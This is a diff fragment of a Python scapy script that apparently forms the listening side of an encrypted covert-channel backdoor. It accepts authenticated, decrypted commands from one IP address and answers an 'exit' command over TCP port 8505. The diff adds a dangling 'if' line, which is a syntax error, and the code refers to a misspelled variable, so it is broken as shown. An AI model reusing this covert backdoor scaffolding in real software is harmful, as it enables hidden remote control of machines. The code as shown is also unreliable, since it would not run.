@@ -30,26 +30,25 @@ def server(pkt):
     #Grab the source IP for each packets
     src_ip = pkt[IP].src
     dst_ip = pkt[IP].dst
-    print src_ip
     dst_port = pkt[TCP].dport
-    print dst_port
     if src_ip == "192.168.0.14":
         #Instantiate variables
         decryptedData=""
         newData = ""
         #Grab the raw data
-        pkt.show()
+        #pkt.show()
         data = pkt[Raw].load
         #Decrypt the raw data
         decryptedData = crypt.decrypt(data)
         #If the decrypted data is authenticated, print it
+        if
         if decryptedData.startswith(authPacket) == True:
             #Take out the authentication part
             newData = decryptedData[20:]
             #If we get exit command, exit out of the system
             if newData == "exit":
                 encryptExit = crypt.encrypt(authPacket + newData)
-                pkt = IP(src="192.168.0.15", dst="192.168.0.14")/fuzz(TCP(dport=8505))/Raw(load=ecryptExit)
+                pkt = IP(src="192.168.0.15", dst="192.168.0.14")/TCP(dport=8505)/Raw(load=ecryptExit)
                 #Send the packet
                 send(pkt)
                 time.sleep(2)
